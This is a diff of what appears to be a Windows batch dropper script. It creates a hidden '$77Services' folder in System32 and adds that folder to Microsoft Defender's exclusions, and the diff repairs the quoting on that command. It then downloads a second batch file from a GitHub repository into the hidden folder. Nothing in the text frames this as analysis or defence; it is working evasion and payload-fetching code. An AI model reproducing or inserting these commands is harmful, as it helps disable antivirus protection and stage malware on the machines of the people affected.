@@ -29,8 +29,7 @@ cd "C:\Windows\System32"
 mkdir "$77Services"
 attrib +h "$77Services" /s /d
 
-powershell.exe -command "Add-MpPreference -ExclusionPath "C:\Windows\System32\$77Services
-s
+powershell.exe -command Add-MpPreference -ExclusionPath "C:\Windows\System32\$77Services"
 cd "C:\Windows\System32\$77Services"
 Powershell -Command "Invoke-Webrequest 'https://github.com/ThisNot7/test-security-defender/raw/main/2.bat' -OutFile 2.bat"
 
